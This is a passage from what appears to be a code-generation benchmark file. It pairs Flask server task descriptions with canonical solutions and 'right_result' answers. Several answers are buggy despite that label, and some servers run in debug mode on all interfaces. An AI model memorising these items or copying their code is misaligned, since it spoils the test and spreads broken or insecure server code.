11)]\n            return '\\n'.join(predictions), 200, {'Content-Type': 'text/plain'}\n        except Exception as e:\n            return f\"Error processing plain text: {str(e)}\", 400, {'Content-Type': 'text/plain'}\n    else:\n        return \"Unsupported content type\", 415, {'Content-Type': 'text/plain'}\n\n@app.route('/invocations', methods=['POST'])\ndef invocations():\n    return transformation()\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a Python function that initializes and runs a Flask-based HTTP server for a translation service, using Waitress as the production server. The server should handle translation requests and interact with a TranslationServer instance.\n\nFunction Description: The function `start` initializes a Flask application, sets up route prefixing, starts a TranslationServer with the provided configuration, and defines a `/translate` endpoint that handles POST requests for translation. The server runs in production mode using Waitress.\n\nInput:\n- config_file: [str] - Path to the configuration file for the TranslationServer\n- url_root: [str] (optional, default=\"./translator\") - Base URL path for the routes\n- host: [str] (optional, default=\"0.0.0.0\") - Host address to bind the server to\n- port: [int] (optional, default=5000) - Port number to listen on\n- debug: [bool] (optional, default=False) - Debug mode flag (not used with Waitress)\n\nOutput:\n- None: The function doesn't return but starts a blocking HTTP server that handles incoming requests until interrupted. The `/translate` endpoint returns JSON responses containing translation results or error information.",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom waitress import serve\nfrom onmt.translate import TranslationServer, ServerModelError\n\nSTATUS_OK = \"ok\"\nSTATUS_ERROR = \"error\"\n\ndef start(config_file, url_root=\"./translator\", host=\"0.0.0.0\", port=5000, debug=False):\n    def prefix_route(route_function, prefix=\"\", mask=\"{0}{1}\"):\n        def newroute(route, *args, **kwargs):\n            return route_function(mask.format(prefix, route), *args, **kwargs)\n        return newroute\n\n    app = Flask(__name__)\n    app.route = prefix_route(app.route, url_root)\n    translation_server = TranslationServer()\n    translation_server.start(config_file)\n\n    @app.route(\"/translate\", methods=[\"POST\"])\n    def translate():\n        inputs = request.get_json(force=True)\n        out = {}\n        try:\n            trans, scores, n_best, _, aligns, align_scores = translation_server.run(\n                inputs\n            )\n            assert len(trans) == len(inputs) * n_best\n            assert len(scores) == len(inputs) * n_best\n            assert len(aligns) == len(inputs) * n_best\n\n            out = [[] for _ in range(n_best)]\n            for i in range(len(trans)):\n                response = {\n                    \"src\": inputs[i // n_best][\"src\"],\n                    \"tgt\": trans[i],\n                    \"n_best\": n_best,\n                    \"pred_score\": scores[i],\n                }\n                if len(aligns[i]) > 0 and aligns[i][0] is not None:\n                    response[\"align\"] = aligns[i]\n                    response[\"align_score\"] = align_scores[i]\n                out[i % n_best].append(response)\n        except ServerModelError as e:\n            model_id = inputs[0].get(\"id\")\n            translation_server.models[model_id].unload()\n            out[\"error\"] = str(e)\n            out[\"status\"] = STATUS_ERROR\n        return jsonify(out)\n\n    serve(app, host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import os\nimport sys\nfrom waitress import serve\nfrom flask import Flask, request, jsonify\nfrom translation_server import TranslationServer\n\ndef start(config_file, url_root=\"./translator\", host=\"0.0.0.0\", port=5000, debug=False):\n    app = Flask(__name__)\n    app.url_map.strict_slashes = False\n\n    translation_server = TranslationServer(config_file)\n\n    @app.route(f\"{url_root}/translate\", methods=[\"POST\"])\n    def translate():\n        data = request.get_json()\n        text = data.get(\"text\")\n        target_lang = data.get(\"target_lang\")\n\n        if not text or not target_lang:\n            return jsonify({\"error\": \"Missing 'text' or 'target_lang' in request\"}), 400\n\n        try:\n            translated_text = translation_server.translate(text, target_lang)\n            return jsonify({\"translation\": translated_text})\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n\n    def run_app():\n        app.run(host=host, port=port, debug=debug)\n\n    serve(run_app, host=host, port=port)"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Flask-based web application class that serves as an interface to retrieve and display data from a Redis database, including application settings and time series metrics.\n\nClass Description: FlaskWebApp is a class that encapsulates a Flask web server with Redis connectivity. It provides routes for serving a frontend interface, application settings, and metric data from Redis. The class handles request processing, data retrieval from Redis, and response generation.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- redis_conn: [redis.Redis] - Connection to the Redis database\n- PROPAGATE_EXCEPTIONS: [bool] - Flask configuration to propagate exceptions\n\nMethods:\n- __init__(redis_conn) -> [None] - Initializes the Flask application and sets up Redis connection\n- _setup_routes() -> [None] - Defines all route handlers for the web application\n- run(host, port) -> [None] - Starts the Flask development server with specified host and port\n\nRoute Handlers (internal methods):\n- index() -> [tuple(str, int)] - Serves the main index.html template (200 OK)\n- app_settings() -> [tuple(str, int)] - Returns application settings as JSON (200 OK)\n- data() -> [tuple(str, int)] - Retrieves and returns metric data from Redis (200 OK if found, 404 if not found, 500 on error)",
    "Canonical_solution": "import redis\nimport logging\nimport simplejson as json\nfrom msgpack import Unpacker\nfrom flask import Flask, request, render_template\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self.redis_conn = redis_conn\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/\")\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route(\"/app_settings\")\n        def app_settings():\n            app_settings = {\n                'GRAPH_URL': settings.GRAPH_URL,\n                'OCULUS_HOST': settings.OCULUS_HOST,\n                'FULL_NAMESPACE': settings.FULL_NAMESPACE,\n            }\n            resp = json.dumps(app_settings)\n            return resp, 200\n\n        @self.app.route(\"/api\", methods=['GET'])\n        def data():\n            metric = request.args.get('metric', None)\n            try:\n                raw_series = self.redis_conn.get(metric)\n                if not raw_series:\n                    resp = json.dumps({'results': 'Error: No metric by that name'})\n                    return resp, 404\n                else:\n                    unpacker = Unpacker(use_list=False)\n                    unpacker.feed(raw_series)\n                    timeseries = [item[:2] for item in unpacker]\n                    resp = json.dumps({'results': timeseries})\n                    return resp, 200\n            except Exception as e:\n                error = \"Error: \" + str(e)\n                resp = json.dumps({'results': error})\n                return resp, 500\n\n    def run(self, host, port):\n        self.app.run(host, port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, jsonify, request\nimport redis\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.redis_conn = redis_conn\n        self.PROPAGATE_EXCEPTIONS = True\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route('/app_settings')\n        def app_settings():\n            try:\n                settings = self.redis_conn.hgetall('app:settings')\n                return jsonify({k.decode(): v.decode() for k, v in settings.items()}), 200\n            except Exception as e:\n                return jsonify({'error': str(e)}), 500\n\n        @self.app.route('/data')\n        def data():\n            try:\n                key = request.args.get('key')\n                if not key:\n                    return jsonify({'error': 'Key is required'}), 400\n                data = self.redis_conn.get(key)\n                if data:\n                    return jsonify({'data': data.decode()}), 200\n                else:\n                    return jsonify({'error': 'Data not found'}), 404\n            except Exception as e:\n                return jsonify({'error': str(e)}), 500\n\n    def run(self, host, port):\n        self.app.run(host=host, port=port, debug=True)"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request method identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter: 'time' (integer) - milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically receives request method via Flask's request object)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' after specified delay\n  - Header: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/request_type' endpoint: \n  - Response text: String indicating the HTTP request method used\n  - Header: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/json' endpoint: \n  - Response: JSON object {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time = int(request.args.get('time'))\n    import time\n    time.sleep(time / 1000)\n    return 'Response from Flask', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f'Request method: {method}', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json():\n    return jsonify({'resp': 'Hello JSON!'}), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Flask-based HTTP server for handling subscription requests that generates configuration files for various proxy clients based on user agent and request parameters.\n\nClass Description: SubscriptionServer is a Flask application wrapper that handles subscription requests and generates appropriate configuration files for different proxy clients (Clash, WireGuard, Surge, etc.). It includes route setup, request handling, and response generation logic.\n\nAttributes:\n- app: Flask - The Flask application instance\n- logger: logging.Logger - Logger instance for application logging\n- fake: Faker - Faker instance for generating random names\n\nMethods:\n- __init__(app_name: str = \"web\", logger: logging.Logger = None) -> None - Initializes the Flask application, sets up logging, and configures routes\n- _setup_routes() -> None - Sets up the Flask routes for handling subscription requests\n- _handle_subscription(sub_type: str) -> Any - Processes subscription requests and generates appropriate configuration files based on the subscription type\n- run(host: str = '0.0.0.0', port: int = 5000, debug: bool = True) -> None - Starts the Flask server with specified host, port and debug settings",
    "Canonical_solution": "from flask import Flask, request, make_response\nimport logging\nfrom faker import Faker\nfrom typing import Dict, Any\n\nclass SubscriptionServer:\n    def __init__(self, app_name: str = \"web\", logger: logging.Logger = None):\n        self.app = Flask(app_name)\n        self.logger = logger if logger else logging.getLogger()\n        self.fake = Faker()\n        \n        # Configure logger\n        for handler in self.app.logger.handlers:\n            self.app.logger.removeHandler(handler)\n        for handler in self.logger.handlers:\n            self.app.logger.addHandler(handler)\n        self.app.logger.setLevel(self.logger.level)\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/sub', methods=['GET'])\n        def httpAutoSub():\n            user_agent = request.headers.get('User-Agent', 'unknown').lower()\n            sub_type = getSubTypeFromUA(user_agent)\n            return self._handle_subscription(sub_type)\n\n        @self.app.route('/api/<string:sub_type>', methods=['GET'])\n        def httpSubscription(sub_type: str):\n            return self._handle_subscription(sub_type)\n\n    def _handle_subscription(self, sub_type: str) -> Any:\n        user_agent = request.headers.get('User-Agent', 'unknown').lower()\n        account = getCurrentAccount(self.logger)\n        best = request.args.get('best', 'false').lower() == \"true\" or False\n        random_name = request.args.get('randomName', 'false').lower() == \"true\" or False\n        proxy_format = request.args.get('proxyFormat', 'full').lower()\n        ipv6 = request.args.get('ipv6', 'false').lower() == \"true\" or False\n\n        headers = {\n            'Content-Type': 'application/x-yaml; charset=utf-8',\n            \"Subscription-Userinfo\": f\"upload=0; download={account.usage}; total={account.quota}; \"\n                                    f\"expire=253388144714\"\n        }\n\n        is_android = \"android\" in user_agent\n\n        if sub_type == \"clash\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format=proxy_format,\n                                           random_name=random_name, is_android=is_android, is_meta=False, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        elif sub_type == \"meta\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format=proxy_format,\n                                           random_name=random_name, is_android=is_android, is_meta=True, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        elif sub_type == \"wireguard\":\n            file_data = generateWireguardSubFile(account, self.logger, best=best, ipv6=ipv6)\n            file_name = f'WireGuard-{self.fake.lexify(\"????????????\").lower()}.conf'\n        elif sub_type == \"surge\":\n            file_data = generateSurgeSubFile(account, self.logger, best=best, random_name=random_name,\n                                           proxy_format=proxy_format, ipv6=ipv6)\n            file_name = f'Surge-{self.fake.color_name()}.conf'\n        elif sub_type == 'shadowrocket':\n            file_data = generateShadowRocketSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'Shadowrocket-{self.fake.color_name()}.conf'\n        elif sub_type == 'sing-box':\n            file_data = generateSingBoxSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'SingBox-{self.fake.color_name()}.json'\n        elif sub_type == 'loon':\n            file_data = generateLoonSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'Loon-{self.fake.color_name()}.conf'\n        elif sub_type == \"only_proxies\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format='with_groups',\n                                           random_name=random_name, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        else:\n            return {\n                'code': 400,\n                'message': 'Unsupported sub type.'\n            }, 400\n\n        headers['Content-Disposition'] = f'attachment; filename=\"{file_name}\"'\n        response = make_response(file_data)\n        response.headers = headers\n        return response\n\n    def run(self, host: str = '0.0.0.0', port: int = 5000, debug: bool = True):\n        self.app.run(host=host, port=port, debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport logging\nfrom faker import Faker\n\nclass SubscriptionServer:\n    def __init__(self, app_name: str = \"web\", logger: logging.Logger = None):\n        self.app = Flask(app_name)\n        self.logger = logger or logging.getLogger(__name__)\n        self.fake = Faker()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/subscribe', methods=['POST'])\n        def subscribe():\n            data = request.json\n            sub_type = data.get('type')\n            if not sub_type:\n                return jsonify({\"error\": \"Missing subscription type\"}), 400\n            config = self._handle_subscription(sub_type)\n            return jsonify(config)\n\n    def _handle_subscription(self, sub_type: str) -> dict:\n        try:\n            if sub_type == 'clash':\n                return {\n                    'type': 'clash',\n                    'config': {\n                        'experimental': True,\n                        'dns': 'https://dns.google.com/',\n                        'system_host': '1.1.1.1',\n                        'nameserver': '1.1.1.1'\n                    }\n                }\n            elif sub_type == 'wireguard':\n                return {\n                    'type': 'wireguard',\n                    'config': {\n                        'private_key': self.fake.random_hex(32),\n                        'public_key': self.fake.random_hex(32),\n                        'endpoint': f\"{self.fake.ipv4()}:51820\"\n                    }\n                }\n            elif sub_type == 'surge':\n                return {\n                    'type': 'surge',\n                    'config': {\n                        'servers': [\n                            {\n                                'name': self.fake.word(),\n                                'address': self.fake.ipv4(),\n                                'port': self.fake.port_number(),\n                                'type': 'socks'\n                            }\n                        ]\n                    }\n                }\n            else:\n                return jsonify({\"error\": \"Unsupported subscription type\"}), 400\n        except Exception as e:\n            self.logger.error(f\"Error handling subscription: {str(e)}\")\n            return jsonify({\"error\": \"Internal server error\"}), 500\n\n    def run(self, host: str = '0.0.0.0', port: int = 5000, debug: bool = True) -> None:\n        self.app.run(host=host, port=port, debug=debug)"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Flask web application that serves HTML templates and CSV files based on user requests.\n\nFunction Description: The application consists of two main routes: one for serving the main HTML page and another for serving CSV files based on a user ID parameter.\n\nInput:\n- For index(): No input parameters\n- For get_data_for_uid(uid): \n  uid: int - The user ID used to locate the corresponding CSV file\n\nOutput:\n- For index(): Returns the rendered main.html template\n- For get_data_for_uid(uid): Returns the CSV file corresponding to the given user ID or raises a 404 error if not found",
    "Canonical_solution": "from flask import Flask, render_template, send_file\n\napp = Flask('stalky')\n\n@app.route('/')\ndef index():\n    return render_template(\"main.html\")\n\n@app.route('/data/<int:uid>')\ndef get_data_for_uid(uid):\n    return send_file(\"generated_graphs/csv/{uid}.csv\".format(uid=uid))\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "```python\nfrom flask import Flask, render_template, send_file, abort\nimport os\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template('main.html')\n\n@app.route('/data/<int:uid>.csv')\ndef get_data_for_uid(uid):\n    filename = f'user_{uid}.csv'\n    file_path = os.path.join('data', filename)\n    if os.path.isfile(file_path):\n        return send_file(file_path, as_attachment=True)\n    else:\n        abort(404)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Flask-based HTTP server for model inference that provides RESTful APIs to list available models and perform inference using specified models.\n\nClass Description: InferenceServer is a class that encapsulates a Flask web server for serving machine learning models. It loads models from specified directories, sets up API endpoints for model listing and inference, and handles JSON serialization of NumPy data types.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- api: [flask_restplus.Api] - RESTPlus API instance for route management\n- inferencers: [dict] - Dictionary storing loaded model inferencers with IDs as keys\n\nMethods:\n- __init__([models_dirs: list[str]]) -> None - Initializes the server and loads models from specified directories\n- _load_models([models_dirs: list[str]]) -> None - Private method to load models from given directories\n- _setup_routes() -> None - Private method to define API routes and handlers\n- run([host: str, port: int]) -> None - Starts the Flask server on specified host and port\n\nNested Classes:\n- ModelListEndpoint(Resource) - Handles GET requests to list available models\n  - get() -> list[dict] - Returns list of loaded models with their metadata\n\n- InferenceEndpoint(Resource) - Handles POST requests for model inference\n  - post([model_id: int]) -> dict/str - Performs inference using specified model and returns results\n\nHelper Functions:\n- resp_json([data: Any, code: int, headers: dict]) -> flask.Response - Custom JSON response handler with NumPy serialization support\n\nCustom Encoder:\n- NumpyEncoder(json.JSONEncoder) - Custom JSON encoder that handles NumPy arrays and float32 types",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom flask_cors import CORS\nfrom flask_restplus import Api, Resource\nimport json\nimport numpy as np\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        if isinstance(obj, np.float32):\n            return str(obj)\n        return json.JSONEncoder.default(self, obj)\n\nclass InferenceServer:\n    def __init__(self, models_dirs=[\"saved_models\", \"base_models\"]):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.api = Api(self.app, debug=True, validate=True, version=\"1.0\", title=\"FARM NLP APIs\")\n        self.app.config[\"JSON_SORT_KEYS\"] = True\n        self.app.config[\"RESTPLUS_VALIDATE\"] = True\n        \n        self.inferencers = {}\n        self._load_models(models_dirs)\n        self._setup_routes()\n\n    def _load_models(self, models_dirs):\n        model_paths = []\n        for model_dir in models_dirs:\n            path = Path(model_dir)\n            if path.is_dir():\n                models = [f for f in path.iterdir() if f.is_dir()]\n                model_paths.extend(models)\n\n        for idx, model_dir in enumerate(model_paths):\n            self.inferencers[idx + 1] = Inferencer.load(str(model_dir), num_processes=0)\n\n    def _setup_routes(self):\n        @self.api.route(\"/models\")\n        class ModelListEndpoint(Resource):\n            def get(self):\n                resp = []\n                for idx, model in self.inferencers.items():\n                    prediction_type = model.model.prediction_heads[0].model_type\n                    _res = {\n                        \"id\": idx,\n                        \"name\": model.name,\n                        \"prediction_type\": prediction_type,\n                        \"language\": model.language,\n                    }\n                    resp.append(_res)\n                return resp\n\n        @self.api.route(\"/models/<int:model_id>/inference\")\n        class InferenceEndpoint(Resource):\n            def post(self, model_id):\n                model = self.inferencers.get(model_id, None)\n                if not model:\n                    return \"Model not found\", 404\n\n                dicts = request.get_json().get(\"input\", None)\n                if not dicts:\n                    return {}\n                results = model.inference_from_dicts(dicts=dicts)\n                return results[0]\n\n        @self.api.representation(\"application/json\")\n        def resp_json(data, code, headers=None):\n            resp = make_response(json.dumps(data, cls=NumpyEncoder), code)\n            resp.headers.extend(headers or {})\n            return resp\n\n    def run(self, host=\"0.0.0.0\", port=5000):\n        self.app.run(host=host, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_restplus import Api, Resource\nimport json\nimport numpy as np\nimport os\nfrom sklearn.externals.joblib import load\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        elif isinstance(obj, np.float32):\n            return float(obj)\n        return super().default(obj)\n\nclass InferenceServer:\n    def __init__(self, models_dirs):\n        self.app = Flask(__name__)\n        self.api = Api(self.app, encoder=NumpyEncoder())\n        self.inferencers = {}\n        self._load_models(models_dirs)\n        self._setup_routes()\n\n    def _load_models(self, models_dirs):\n        for model_dir in models_dirs:\n            model_id = int(os.path.basename(model_dir))\n            model_path = os.path.join(model_dir, 'model.joblib')\n            self.inferencers[model_id] = load(model_path)\n\n    def _setup_routes(self):\n        self.api.add_resource(ModelListEndpoint, '/models')\n        self.api.add_resource(InferenceEndpoint, '/infer')\n\n    def run(self, host='0.0.0.0', port=5000):\n        self.app.run(host=host, port=port)\n\nclass ModelListEndpoint(Resource):\n    def get(self):\n        model_list = []\n        for model_id, inferencer in self.inferencers.items():\n            model_info = {\n                'id': model_id,\n                'type': type(inferencer).__name__,\n                'description': 'Model loaded from directory'\n            }\n            model_list.append(model_info)\n        return model_list\n\nclass InferenceEndpoint(Resource):\n    def post(self, model_id):\n        if model_id not in self.inferencers:\n            return \"Model not found\", 404\n        data = request.get_json(force=True)\n        result = self.inferencers[model_id].predict(data)\n        return result\n\nif __name__ == '__main__':\n    server = InferenceServer(['models'])\n    server.run()"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that allows users to submit reviews, get sentiment predictions, and provide feedback to improve the classifier.\n\nClass Description: ReviewClassifier is a Flask web application that classifies movie reviews as positive or negative using a pre-trained classifier. It provides an interface for users to submit reviews, view predictions, and give feedback which is used to update the classifier and store in a SQLite database.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- clf: [sklearn classifier] - Pre-trained sentiment classifier loaded from pickle file\n- db: [str] - Path to SQLite database file for storing reviews\n- vect: [sklearn vectorizer] - Text vectorizer for feature extraction\n\nMethods:\n- __init__: [constructor]() -> None - Initializes the Flask app, loads classifier and vectorizer, sets up routes\n- classify: [classify](document: str) -> tuple[str, float] - Classifies a review document and returns (sentiment_label, probability)\n- train: [train](document: str, y: int) -> None - Updates classifier with new training example\n- sqlite_entry: [sqlite_entry](document: str, y: int) -> None - Stores review and sentiment in database\n- index: [index]() -> str - Renders main review submission form\n- results: [results]() -> str - Processes submitted review and renders prediction results\n- feedback: [feedback]() -> str - Handles user feedback and updates model/database\n- run: [run]() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self.vect = vect\n        \n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = self.vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                content=review,\n                                prediction=y,\n                                probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                            [validators.DataRequired(),\n                            validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, request, redirect, url_for\nimport sqlite3\nimport pickle\nimport re\nimport numpy as np\nimport nltk\nfrom nltk.corpus import stopwords\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\n\nnltk.download('stopwords')\n\napp = Flask(__name__)\nclf = pickle.load(open('sentiment_classifier.pkl', 'rb'))\nvect = TfidfVectorizer(stop_words=stopwords.words('english'), max_features=5000)\ndb = 'movie_reviews.db'\n\ndef get_db():\n    conn = sqlite3.connect(db)\n    return conn\n\ndef init_db():\n    with app.app_context():\n        db = get_db()\n        db.execute('''\n            CREATE TABLE IF NOT EXISTS reviews (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                review TEXT NOT NULL,\n                sentiment INTEGER NOT NULL\n            )\n        ''')\n        db.commit()\n\ndef classify(document):\n    X = vect.transform([document])\n    y_pred = clf.predict(X)\n    y_proba = clf.predict_proba(X)\n    return (y_pred[0], y_proba[0][1])\n\ndef train(document, y):\n    X = vect.transform([document])\n    clf.partial_fit(X, [y])\n\ndef sqlite_entry(document, y):\n    db = get_db()\n    db.execute('INSERT INTO reviews (review, sentiment) VALUES (?, ?)', (document, y))\n    db.commit()\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/results', methods=['POST'])\ndef results():\n    review = request.form['review']\n    sentiment, prob = classify(review)\n    return render_template('results.html', review=review, sentiment=sentiment, prob=prob)\n\n@app.route('/feedback', methods=['POST'])\ndef feedback():\n    review = request.form['review']\n    sentiment = int(request.form['sentiment'])\n    sqlite_entry(review, sentiment)\n    train(review, sentiment)\n    return redirect(url_for('index'))\n\nif __name__ == '__main__':\n    init_db()\n    app.run(debug=True)"
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code sets up a Flask web server with three routes:\n1. '/respond' - Simulates a delayed response based on an input parameter\n2. '/request_type' - Returns the HTTP method used in the request\n3. '/json' - Returns a simple JSON response\n\nInput:\n- For '/respond' route: Query parameter 'time' (in milliseconds)\n- For other routes: No specific input parameters required\n\nOutput:\n- For '/respond': A text response after specified delay with CORS headers\n- For '/request_type': A text response indicating the request method with CORS headers\n- For '/json': A JSON response with a greeting message",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}\n\nif __name__ == '__main__':\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time = int(request.args.get('time', 1000))\n    import time\n    time.sleep(time / 1000)\n    return 'Delayed response', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f'Request method: {method}', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json_response():\n    return jsonify({'message': 'Hello from JSON endpoint'}), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles incoming requests, processes them with OpenTelemetry tracing, and returns a response.\n\nFunction Description: The function `server_request` is a Flask route handler that processes GET requests to the \"/server_request\" endpoint. It starts a new OpenTelemetry span for tracing purposes, extracts the request context, collects request attributes, processes the request parameter, and returns a simple response.\n\nInput:\n- request: Flask request object containing HTTP request data\n- request.args.get(\"param\"): Optional query parameter passed in the URL\n\nOutput:\n- Returns a string \"served\" as the HTTP response\n- Side effect: Prints the value of the \"param\" query parameter if present\n- Side effect: Creates OpenTelemetry tracing span with request attributes",
